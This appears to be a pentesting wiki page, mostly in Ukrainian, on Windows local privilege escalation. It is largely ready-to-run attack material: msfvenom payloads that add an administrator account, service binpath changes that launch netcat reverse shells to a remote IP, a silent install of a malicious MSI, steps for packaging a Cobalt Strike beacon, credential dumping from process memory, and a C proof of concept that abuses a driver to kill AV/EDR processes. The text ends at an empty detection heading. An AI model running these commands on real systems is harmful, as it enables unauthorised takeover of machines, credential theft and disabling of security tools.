# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Access Tokens

**Якщо ви не знаєте, що таке Windows Access Tokens, прочитайте наступну сторінку перед продовженням:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наступну сторінку для отримання додаткової інформації про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Якщо ви не знаєте, що таке integrity levels у Windows, вам слід прочитати наступну сторінку перед продовженням:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Контролі безпеки Windows

У Windows існують різні механізми, які можуть **перешкодити вам у перерахунку системи (enumerating the system)**, блокувати запуск виконуваних файлів або навіть **виявити вашу діяльність**. Ви повинні **прочитати** наступну **сторінку** та **перелічити** усі ці **захисні механізми** перед початком privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Інформація про систему

### Перевірка інформації про версію

Перевірте, чи у версії Windows є відомі вразливості (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

[цей сайт](https://msrc.microsoft.com/update-guide/vulnerability) корисний для пошуку детальної інформації про Microsoft security vulnerabilities. Ця база налічує понад 4,700 security vulnerabilities, що демонструє **величезну поверхню атаки**, яку має середовище Windows.

**На системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub репозиторії з exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Чи збережені якісь credential/Juicy дані в env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell файли транскрипції

Дізнайтеся, як увімкнути це, за адресою [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконання конвеєрів PowerShell фіксуються, охоплюючи виконані команди, виклики команд та частини скриптів. Проте повні відомості про виконання та результати виводу можуть не зберігатися.

Щоб увімкнути це, дотримуйтесь інструкцій у розділі документації "Transcript files", обравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій у PowersShell logs, ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Фіксується повний запис діяльності та весь вміст виконання скрипта, що гарантує документування кожного блоку коду під час його запуску. Цей процес зберігає всебічний audit trail кожної дії, цінний для forensics та аналізу шкідливої поведінки. Документуючи всю активність у момент виконання, він забезпечує детальні відомості про процес.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Записи подій для Script Block можна знайти в Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, ви можете використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Почніть із перевірки, чи мережа використовує не-SSL WSUS для оновлень, виконавши наступне в cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримаєте відповідь, таку як одна з цих:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Тоді, **it is exploitable.** Якщо останнє значення реєстру дорівнює `0`, запис WSUS буде ігноровано.

Щоб експлуатувати цю вразливість, можна використовувати інструменти, такі як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це MiTM weaponized exploits scripts для інжекції 'fake' оновлень у non-SSL WSUS трафік.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, це дефект, який використовує цей баг:

> Якщо ми маємо можливість змінити наш локальний проксі користувача, і Windows Updates використовує проксі, налаштований у Internet Explorer’s settings, то ми отримаємо можливість запустити [PyWSUS](https://github.com/GoSecure/pywsus) локально, щоб перехопити власний трафік і виконати код як підвищений користувач на нашому ресурсі.
>
> Більш того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його certificate store. Якщо ми згенеруємо self-signed certificate для WSUS hostname і додамо цей сертифікат у certificate store поточного користувача, ми зможемо перехоплювати як HTTP, так і HTTPS WSUS трафік. WSUS не використовує механізми на зразок HSTS для реалізації trust-on-first-use валідації сертифіката. Якщо представлений сертифікат довірений користувачем і має правильний hostname, він буде прийнятий службою.

Ви можете використати цю вразливість за допомогою інструменту [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли він буде доступний).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато корпоративних агентів відкривають localhost IPC інтерфейс і привілейований канал оновлень. Якщо enrollment можна перенаправити на сервер атакуючого і updater довіряє rogue root CA або має слабкі перевірки підпису, локальний користувач може доставити шкідливий MSI, який служба SYSTEM встановить. Див. узагальнену техніку (на основі Netskope stAgentSvc chain – CVE-2025-0309) тут:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є meterpreter сесія, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI бінарний файл для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI інсталятор, який запитує додавання користувача/групи (тому вам потрібен GIU доступ):
```
Write-UserAddMSI
```
Просто запустіть створений binary, щоб підвищити привілеї.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, ви можете використати: _exploit/windows/local/always_install_elevated_

## Антивірус та детектори

### Налаштування аудиту

Ці налаштування визначають, що **реєструється**, тому слід звертати на них увагу.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди надсилаються логи.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначено для **управління локальними Administrator паролями**, що гарантує, що кожен пароль є **унікальним, випадковим і регулярно оновлюваним** на комп'ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory і доступні лише користувачам, яким через ACLs надано відповідні права, що дозволяє їм переглядати локальні admin-паролі за наявності відповідного дозволу.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо увімкнено, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист для Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати його пам'ять** або впроваджувати код, додатково захищаючи систему.\
[**Детальніше про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** було впроваджено у **Windows 10**. Його мета — захищати облікові дані, збережені на пристрої, від загроз, таких як pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** автентифікуються **Local Security Authority** (LSA) та використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай встановлюються domain credentials.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перелічення користувачів та груп

Вам слід перевірити, чи мають якісь із груп, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до якоїсь привілейованої групи, ви можете підвищити свої привілеї**. Дізнайтеся про привілейовані групи та як зловживати ними для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **token** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** та як ними зловживати:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійдені користувачі / Сесії
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

По-перше, переглядаючи список процесів, **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папці з бінарними файлами, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** — їх можна використати для підвищення привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**)
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Ви можете створити дамп пам'яті працюючого процесу, використовуючи **procdump** з sysinternals. Сервіси, як-от FTP, містять **credentials in clear text in memory**, спробуйте зробити дамп пам'яті та прочитати credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-додатки

**Застосунки, що запускаються як SYSTEM, можуть дозволити користувачу викликати CMD або переглядати директорії.**

Приклад: "Windows Help and Support" (Windows + F1), знайдіть "command prompt", клацніть "Click to open Command Prompt"

## Служби

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc** щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** з _Sysinternals_ для перевірки необхідного рівня привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнути службу

Якщо ви отримуєте цю помилку (наприклад з SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Ви можете увімкнути її, використовуючи
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Ще один обхідний шлях** цієї проблеми — запустити:
```
sc.exe config usosvc start= auto
```
### **Змінити шлях бінарного файлу сервісу**

У випадку, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для сервісу, можливе змінення виконуваного бінарного файлу сервісу. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапустити службу
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ескалацію привілеїв можна здійснити через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл сервісу.
- **WRITE_DAC**: Дозволяє змінювати права доступу, через що можна змінювати конфігурації сервісів.
- **WRITE_OWNER**: Дозволяє стати власником і змінювати дозволи.
- **GENERIC_WRITE**: Наслідує можливість змінювати конфігурації сервісів.
- **GENERIC_ALL**: Також наслідує можливість змінювати конфігурації сервісів.

Для виявлення й експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.

### Слабкі дозволи бінарних файлів сервісів

**Перевірте, чи можете змінити бінарний файл, що виконується сервісом** або чи маєте **права запису в папці**, де знаходиться бінарник ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати всі бінарні файли, що виконуються сервісом, за допомогою **wmic** (не в system32) і перевірити свої права за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Дозволи на модифікацію реєстру сервісів

Ви повинні перевірити, чи можете змінювати будь-який реєстр сервісів.\
Ви можете **перевірити** ваші **дозволи** щодо реєстру **сервісів**, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** права `FullControl`. Якщо так, бінарний файл, який виконується службою, можна змінити.

Щоб змінити шлях до виконуваного бінарного файлу:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Реєстр служб — дозволи AppendData/AddSubdirectory

Якщо ви маєте цей дозвіл на реєстр, це означає, що **ви можете створювати підреєстри з цього реєстру**. У випадку служб Windows це **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи служби без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожний фрагмент шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows буде намагатися виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічте всі шляхи служб без лапок, за винятком тих, що належать вбудованим службам Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path`  
Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам вказувати дії, які виконуватимуться у разі збою служби. Ця функція може бути налаштована так, щоб вказувати на binary. Якщо цей binary можна замінити, може бути можливим privilege escalation. Більше деталей — у [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Додатки

### Встановлені додатки

Перевірте **permissions of the binaries** (можливо, ви зможете overwrite один і здійснити escalate privileges) та **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете змінити якийсь конфігураційний файл, щоб прочитати певний файл, або чи можете змінити бінарний файл, який буде виконаний від імені облікового запису Administrator (schedtasks).

Один зі способів знайти слабкі дозволи на папки/файли в системі — виконати:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Запуск під час завантаження

**Перевірте, чи можете перезаписати якийсь registry або binary, який буде виконуватиметься іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні дивні/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо драйвер надає довільний примітив читання/запису ядра (поширено в погано реалізованих обробниках IOCTL), ви можете ескалувати привілеї, викравши SYSTEM token безпосередньо з пам'яті ядра. Див. покрокову техніку тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Деякі підписані драйвери сторонніх виробників створюють свій device object зі жорстким SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапора secure DACL не застосовується, коли пристрій відкривається через шлях, що містить додатковий компонент, дозволяючи будь-якому непривілейованому користувачу отримати handle, використовуючи namespace path на кшталт:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Як тільки користувач може відкрити пристрій, привілейовані IOCTLs, які надає драйвер, можуть бути зловживані для LPE та підміни/маніпуляцій. Приклади можливостей, зафіксованих у реальному житті:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Мінімальний PoC шаблон (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Заходи захисту для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об'єктів пристроїв, які мають обмежуватися DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескриптора.
- Обмежуйте IOCTLs (access masks, METHOD_*, перевірка введених даних) та розгляньте посередницькі моделі замість прямих привілеїв ядра.

Ідеї виявлення для захисників
